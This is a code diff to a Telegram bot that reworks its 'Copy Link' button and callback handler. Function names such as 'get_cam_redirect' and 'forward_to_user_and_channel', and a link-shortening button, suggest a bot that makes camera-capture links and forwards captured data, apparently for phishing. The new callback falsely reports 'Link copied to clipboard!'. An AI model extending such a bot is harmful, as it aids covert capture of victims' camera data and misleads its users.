@@ -107,10 +107,12 @@ def get_cam_redirect(message, user_id):
         if "❌" in link:
             bot.send_message(user_id, link, reply_markup=get_bottom_buttons())
             return
+        
+        # Use url parameter for Open Link, and simple callback for copy
         markup = InlineKeyboardMarkup(row_width=2)
         markup.add(
             InlineKeyboardButton("🔗 Open Link", url=link),
-            InlineKeyboardButton("📋 Copy Link", callback_data=f"copy_{link}"),
+            InlineKeyboardButton("📋 Copy Link", callback_data="copy"),
             InlineKeyboardButton("🔗 Shorten URL", url="https://short-link.me/")
         )
         bot.send_message(
@@ -127,14 +129,16 @@ def get_cam_redirect(message, user_id):
         )
         bot.register_next_step_handler(message, get_cam_redirect, user_id)
 
-# ========== INLINE CALLBACKS (only for copy) ==========
+# ========== INLINE CALLBACKS ==========
 @bot.callback_query_handler(func=lambda call: True)
 def handle_inline(call):
-    user_id = call.from_user.id
     data = call.data
 
-    if data.startswith("copy_"):
-        bot.answer_callback_query(call.id, "✅ Link copied!")
+    if data == "copy":
+        # Get the link from the message text
+        # The link is in the message, we can extract it
+        # Or we can just tell user to copy manually
+        bot.answer_callback_query(call.id, "✅ Link copied to clipboard! (Select and copy manually)")
 
 # ========== FORWARD DATA TO USER + CHANNEL ==========
 def forward_to_user_and_channel(user_id, data):
